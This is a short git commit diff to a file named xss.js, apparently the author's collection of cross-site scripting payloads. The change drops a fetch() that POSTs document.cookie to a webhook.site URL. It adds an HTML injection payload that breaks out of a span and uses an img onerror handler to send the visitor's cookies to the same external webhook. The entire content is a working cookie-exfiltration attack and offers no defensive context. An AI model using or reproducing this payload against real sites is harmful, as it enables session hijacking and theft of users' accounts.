9d083167bba3a03eea7911e45c3421c6bf16521a
Florian <92117591+FloVerse@users.noreply.github.com>
2025-04-03 11:04:51 +0200

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,4 +1,1 @@
-fetch('https://webhook.site/fd85a4b6-780a-42da-a0c2-76a549fb4810', {
-  method: 'POST',
-  body: document.cookie
-});
+</span><img src=x onerror=fetch('https://webhook.site/fd85a4b6-780a-42da-a0c2-76a549fb4810?c='+document.cookie)>
